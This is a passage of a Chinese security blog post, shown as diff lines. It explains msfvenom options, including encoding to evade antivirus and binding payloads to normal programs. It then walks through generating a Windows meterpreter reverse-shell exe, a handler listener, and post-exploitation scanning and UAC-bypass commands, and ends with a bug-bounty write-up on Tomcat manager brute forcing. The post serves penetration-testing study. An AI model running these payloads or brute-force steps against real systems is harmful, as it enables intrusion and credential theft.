+<li><code>os</code>：windows&#x2F;, cmd&#x2F;windows&#x2F;,linux&#x2F;, cmd&#x2F;unix&#x2F;,android&#x2F;,java&#x2F;, php&#x2F;</li>
+<li><code>目标架构 (Architecture)</code>: 默认32位(x86),脚本或命令payloads也是不用声明</li>
+<li><code>Payload Type</code>：meterpreter，shell，vncinject，add_user</li>
+<li><code>Connection Method</code>:reverse_tcp &#x2F; reverse_http&#x2F;reverse_php,bind_tcp</li>
+</ul>
+</li>
+<li><p>-f 指定输出格式 例如 exe、c、elf、php、js <code>-f exe</code></p>
+</li>
+<li><p>-e 指定encoder <code>-e x86/shikata_ga_nai</code></p>
+</li>
+<li><p>-a 指定架构  例如 x86(32位) x64(64位)<code>-a x86</code></p>
+</li>
+<li><p>–platform 指定操作系统 <code>-platform Linux</code></p>
+</li>
+<li><p>-s 指定最大长度</p>
+</li>
+<li><p>-b 指定规避字符</p>
+</li>
+<li><p>-i 指定编码次数</p>
+</li>
+<li><p>-x 绑定正常程序 &#96;-x &#x2F;root&#x2F;notepad.exe</p>
+</li>
+<li><p>–shellest 最小化payload</p>
+</li>
+<li><p>lhost&#x3D;192.168.1.20</p>
+</li>
+<li><p>lport&#x3D;9999</p>
+</li>
+<li><p>-o</p>
+</li>
+</ul>
+<p>更多encoder：<img src="/2025/11/23/SRC2/image-20251123212451182.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>不知道具体什么连接写法时，用l和grep查找<code>msfvenom -l payloads | grep windows</code></li>
+</ul>
+<h4 id="这里模拟一次攻击："><a href="#这里模拟一次攻击：" class="headerlink" title="这里模拟一次攻击："></a>这里模拟一次攻击：</h4><p>先用msfvenom生成一个payload<br><img src="/2025/11/23/SRC2/image-20251123212504504.png" srcset="/img/loading.gif" lazyload><br>把生成的木马放到受害机<br><img src="/2025/11/23/SRC2/image-20251123212511344.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.150.14.2 LPORT=4444 -f exe --platform Windows -o shell.exe<br></code></pre></td></tr></table></figure>
+<p>设置本机的ip和端口  确定受害机的指纹</p>
+<p>随后msfconsole建立链接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/multi/handler<br>set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>set LHOST 10.150.14.2 # Kali 虚拟机的 IP（你的攻击机IP）<br>set LPORT 4444  # 和生成 payload 时的端口一致（4444）<br>run<br></code></pre></td></tr></table></figure>
+<p>show options查看是否做好配置<br><img src="/2025/11/23/SRC2/image-20251123212546429.png" srcset="/img/loading.gif" lazyload><br>run开始监听 当受害机点击exe就建立反向shell了<br><img src="/2025/11/23/SRC2/image-20251123212556608.png" srcset="/img/loading.gif" lazyload><br>执行help可以看<code>meterpreter</code>的独立命令系统</p>
+<p>但exe容易被查杀，所以更多情况下生成<code>shellcode</code>代码(二进制字节流)，并通过三方应用或系统漏洞进行注入。<br>shellcode通过<strong>漏洞注入到目标系统的内存中</strong>，再劫持执行流让 CPU 执行它。</p>
+<ul>
+<li>缓冲区溢出         [ 垃圾数据（填满缓冲区） ] + [ 伪造的返回地址 ] + [ Shellcode ]<br>  意思就是本来只有100个字节的缓冲区 正常输入2字节 100字节后就是地址。但通过这个漏洞 攻击者注入200字节 导致cpu处理的时候把恶意注入的100到104或108误以为是返回地址，然后返回地址又指向最后的shellcode</li>
+<li>代码注入漏洞</li>
+<li>恶意文件载体。exe将code解压到内存</li>
+<li>进程注入  meterpreter提权后能进程注入</li>
+</ul>
+<p>在获取到shell后 不仅可以执行命令 还可以扫描网段 扫描端口 获取指纹信息 进行横向移动</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> post/windows/gather/arp_scanner <span class="hljs-attribute">RHOSTS</span>=192.168.9.0/24<br><span class="hljs-built_in">run</span> auxiliary/scanner/portscan/tcp <span class="hljs-attribute">RHOSTS</span>=192.168.9.135 <span class="hljs-attribute">PORTS</span>=3389<br><span class="hljs-built_in">run</span> post/windows/gather/enum_services # 枚举目标服务<br><span class="hljs-built_in">run</span> post/windows/gather/enum_files # 枚举目标服务<br>use exploit/windows/local/bypassuac 提权<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="一次SRC的简单疑似漏洞"><a href="#一次SRC的简单疑似漏洞" class="headerlink" title="一次SRC的简单疑似漏洞"></a>一次SRC的简单疑似漏洞</h2><blockquote>
+<p>边挖边记的 有些细节可能没记上 或者可能没写清楚 这里只做一次某个尝试的记录，不要深究谢谢。</p>
+</blockquote>
+<p>有一次挖edu，在拿到子域名和ip ，只有几个简单的用户登录界面和无回显或过滤的搜索 但xss和sql注入都严密防护，且有防火墙保护，无法爆破和代理访问，但是xray自动扫描勉强扫到一个后台目录<code>http://xxxxxx.edu.cn/manager/html</code>其他域名和ip都是大差不差的同一个现用的页面 ，但这个真的很像少用的 更目录是这样的，这里分析前端源码和提交的表单交了个<code>验证缺陷和无限爆破</code><br><img src="/2025/11/23/SRC2/image-20251123212612496.png" srcset="/img/loading.gif" lazyload><br>后台路近是这样的<br><img src="/2025/11/23/SRC2/image-20251123212619856.png" srcset="/img/loading.gif" lazyload><br>后面就考虑弱密码爆破和路径遍历权限绕过，（可利用MSF）<br>MSF搜一下tomcat的漏洞<code>search tomcat</code>，找到了疑似登录爆破的可利用模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">use auxiliary/scanner/http/tomcat_mgr_login<br></code></pre></td></tr></table></figure>
+<p><img src="/2025/11/23/SRC2/image-20251123212626742.png" srcset="/img/loading.gif" lazyload><br>设置一下选项直接run<br><img src="/2025/11/23/SRC2/image-20251123212634517.png" srcset="/img/loading.gif" lazyload>默认字典没扫到 直接换字典尝试比如</p>
+<ul>
+<li><code>rockyou.txt</code> (巨大，不建议直接跑 Basic Auth，太慢)。</li>
+<li><code>seclists</code> 字典集（更轻量化，针对性强）<br> <img src="/2025/11/23/SRC2/image-20251123212645688.png" srcset="/img/loading.gif" lazyload>最后ip被封了 爆破失败</li>
+</ul>
+<p>看看有没有其他漏洞 访问&#x2F;public<br>得到版本### Apache Tomcat&#x2F;8.5.73<br>找到请求走私等cve<br>最后用这个指纹信息在google搜到了一些cve，先用nuclei试试扫一下<br><img src="/2025/11/23/SRC2/image-20251123212655433.png" srcset="/img/loading.gif" lazyload><br>没扫出什么有用的 但有个f反而提醒我做一下参数\路径爆破 也失败了<br>访问f&#x3D;[ 得到了信息<br><img src="/2025/11/23/SRC2/image-20251123212705712.png" srcset="/img/loading.gif" lazyload><br>最后这个edu我只交了三个洞 </p>
+<ol>
+<li>某个ip存在任意注册漏洞，可以用一次性邮箱注册</li>
+<li><code>http://36.134.62.229/</code>的认证机制缺陷和无限制爆破</li>
+<li>配置缺陷与信息泄露，且可以路径穿越</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SRC2</div>
+      <div>https://i4g5d.github.io/2025/11/23/SRC2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>i4G5d</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/15/Search-grammar/" title="Search_grammar">
+                        <span class="hidden-mobile">Search_grammar</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
